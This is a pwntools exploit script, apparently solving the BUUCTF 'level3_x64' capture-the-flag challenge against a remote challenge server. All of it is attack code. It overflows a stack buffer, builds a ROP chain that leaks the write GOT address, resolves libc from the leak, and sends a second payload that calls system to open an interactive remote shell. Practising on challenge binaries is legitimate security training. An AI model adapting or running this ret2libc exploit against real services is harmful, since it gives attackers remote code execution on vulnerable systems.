from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('../level3_x64')

target = remote('node4.buuoj.cn', 25580)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']

pop_rdi = 0x4006b3
pop_rsi = 0x4006b1

payload = b'a' * 0x80 + b'a' * 0x8 + p64(pop_rdi) + p64(0x1) + p64(pop_rsi) + p64(write_got) + p64(0x0) + p64(write_plt) + p64(main)
target.sendlineafter('Input:\n', payload)
write_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00'))

ans = utils.get_shell_from_libc("write", write_addr)
payload = b'a' * 0x80 + b'a' * 0x8 + p64(pop_rdi) + p64(ans[1]) + p64(ans[0])
target.sendlineafter('Input:\n', payload)
target.interactive()